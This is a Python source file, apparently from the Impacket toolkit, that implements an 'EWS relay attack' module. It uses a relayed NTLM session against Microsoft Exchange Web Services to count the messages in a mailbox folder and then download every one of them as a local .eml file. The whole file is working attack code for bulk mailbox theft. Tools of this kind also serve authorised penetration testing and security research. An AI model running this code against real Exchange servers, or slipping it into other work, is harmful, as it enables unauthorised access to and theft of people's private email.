# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright (C) 2023 Fortra. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   EWS relay attack
#
# Authors:
#   Zer0Way (@Nu11ed09)


import re
import base64
from OpenSSL import crypto
import xml.etree.cElementTree as ET
from impacket import LOG
import os
from base64 import b64decode, b64encode


# cache already attacked clients
ELEVATED = []
exchangeNamespace = {'m': 'http://schemas.microsoft.com/exchange/services/2006/messages', 't': 'http://schemas.microsoft.com/exchange/services/2006/types'}

class EWSAttack:

    def _run(self):
    
        current_folder = self.config.folder
        if current_folder is None:
            current_folder = "inbox"
        count = self.get_count(current_folder)
        LOG.info("Download folder..." + current_folder)
        self.download(current_folder,count)
        LOG.info("Download finished!")
    def download(self,id,count):
        offset = 0 
        i = 0
        while offset <= int(count):
            data = f"""<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                    xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
                    <soap:Body>
                        <FindItem xmlns="http://schemas.microsoft.com/exchange/services/2006/messages"
                            xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
                            Traversal="Shallow">
                            <ItemShape>
                                <t:BaseShape>IdOnly</t:BaseShape>
                            </ItemShape>
                            <IndexedPageItemView MaxEntriesReturned="1000" Offset="{offset}" BasePoint="Beginning" />
                            <ParentFolderIds>
                           <t:DistinguishedFolderId Id="{id}"/>
                         </ParentFolderIds>
                       </FindItem>
                     </soap:Body>
                   </soap:Envelope>"""
            LOG.info("Getting email list...")
            content = self.req(data)
            folderXML = ET.fromstring(content.decode())
            #print(data)
            #print(content)
            for item in folderXML.findall(".//t:ItemId", exchangeNamespace):
                LOG.info("Get message...")
                data2 = f"""<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                    <soap:Body>
                      <m:GetItem>
                    	<m:ItemShape>
                    	  <t:BaseShape>IdOnly</t:BaseShape>
                    	  <t:AdditionalProperties>
                    		<t:FieldURI FieldURI="item:MimeContent" />
                    	  </t:AdditionalProperties>
                    	</m:ItemShape>
                    	<m:ItemIds>
                    	  <t:ItemId Id="{item.get('Id')}" ChangeKey="{item.get('ChangeKey')}" />
                    	</m:ItemIds>
                      </m:GetItem>
                    </soap:Body>
                    </soap:Envelope>"""
                content2 = self.req(data2)
                #print(content2)
                itemXML = ET.fromstring(content2.decode())
                mimeContent = itemXML.find(".//t:MimeContent", exchangeNamespace).text
                LOG.info("Download Message...")
                try:
                    extension = "eml"
                    outputDir = id
                    if not os.path.exists(outputDir):
                        os.makedirs(outputDir)
                    fileName = outputDir + "/item-"+self.username+"-{}.".format(i) + extension
                    with open(fileName, 'wb+') as fileHandle:
                        fileHandle.write(b64decode(mimeContent))
                        fileHandle.close()
                        print("[+] Item [{}] saved successfully".format(fileName))
                except IOError:
                    print("[!] Could not write file [{}]".format(fileName))
                i = i + 1
            offset +=1000

    def get_count(self,id):
        LOG.info("Get numbers of emails...")
        data = f"""<?xml version="1.0" encoding="utf-8"?>
          <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
          xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
          xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
          xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
              <soap:Body>
                  <m:GetFolder>
                      <m:FolderShape>
                          <t:BaseShape>Default</t:BaseShape>
                      </m:FolderShape>
                      <m:FolderIds>
                          <t:DistinguishedFolderId Id="{id}">
                              <t:Mailbox>
                                  <t:EmailAddress></t:EmailAddress>
                              </t:Mailbox>
                          </t:DistinguishedFolderId>
                      </m:FolderIds>
                  </m:GetFolder>
              </soap:Body>
          </soap:Envelope>"""       
        content = self.req(data)
        CountXML = ET.fromstring(content.decode())
        CountContent = CountXML.find(".//t:TotalCount", exchangeNamespace).text
        print(f"Counting the number of messages in an {id}: " + CountContent)
        return CountContent

    def req(self,data):
        headers = {
            "User-Agent": "ExchangeServicesClient/15.00.0913.015",
            "Content-Type": "text/xml",
            "Content-Length": len(data)
        }
        self.client.request("POST", "/EWS/Exchange.asmx", body=data, headers=headers)
        response = self.client.getresponse()
        content = response.read()
        return content